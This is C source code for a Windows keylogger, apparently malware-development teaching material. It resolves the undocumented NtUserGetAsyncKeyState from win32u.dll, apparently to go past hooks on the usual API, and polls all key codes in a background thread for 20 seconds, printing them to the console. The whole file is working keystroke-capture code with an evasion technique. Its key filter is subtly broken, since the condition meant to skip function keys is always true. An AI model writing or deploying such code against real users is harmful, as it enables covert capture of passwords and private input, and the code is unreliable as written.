#include <windows.h>
#include <stdio.h>

#define MONITOR_TIME   20000 // monitor keyboard keystrokes for 20 seconds

// https://doxygen.reactos.org/d4/d49/win32ss_2user_2ntuser_2keyboard_8c.html#ab695305553e9ff550bcefb0e5acec9de
typedef SHORT (NTAPI* fnNtUserGetAsyncKeyState)(
	_In_    INT     Key
);

VOID KeyboardClicksLogger() {
    SHORT                       state                       = NULL;
    HMODULE		                hWin32uModule			    = NULL;
    fnNtUserGetAsyncKeyState	pNtUserGetAsyncKeyState     = NULL;

	// Load Win32u.dll to the current process so that GetModuleHandle will work
	if (LoadLibraryA("WIN32U.DLL") == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return;
	}

	// Getting the handle of win32u.dll using GetModuleHandle
    // https://strontic.github.io/xcyclopedia/library/win32u.dll-D639CD289CD628B0FB56732AC9994538.html
	hWin32uModule = GetModuleHandle("WIN32U.DLL");
	if (hWin32uModule == NULL){
		printf("[!] GetModuleHandle Failed With Error : %d\n", GetLastError());
		return;
	}

    // Fetching NtUserGetAsyncKeyState's address from win32u.dll
    pNtUserGetAsyncKeyState = (fnNtUserGetAsyncKeyState)GetProcAddress(hWin32uModule, "NtUserGetAsyncKeyState");
    if (pNtUserGetAsyncKeyState == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
        return;
    }

    printf("[*] Output: ");

	while (TRUE) {
        // Sleep for better performance
        // We dont need to query every clock cycle so lets sleep for 10 milliseconds
        Sleep(10);
        
        // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        // Range from 0x01-0xFE
		for (int i = 1; i < 255; i++) {
            // Get state
            state = (SHORT)pNtUserGetAsyncKeyState((DWORD)i);

			// https://msdn.microsoft.com/en-us/library/windows/desktop/ms646293(v=vs.85).aspx
            // 1        = press
            // -32767   = held down
            if (state == 1 || state == -32767) {
                // Remove mouse inputs (0x01-0x07), fn keys (0x70-0x8F)
                if (( 7 < i) && ( 120 < i || i < 143))
				    printf("\\x%02X", i);
            }
		}
	}
    
    return;
}

int main() {
    HANDLE  hThread         = NULL;
    DWORD   dwThreadId      = NULL;

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)KeyboardClicksLogger, NULL, NULL, &dwThreadId);
    if (hThread) {
        printf("[i] Thread %d Is Created To Monitor Keyboard Clicks For %d Seconds\n", dwThreadId, (MONITOR_TIME / 1000));
        WaitForSingleObject(hThread, MONITOR_TIME);
    }

    return 0;
}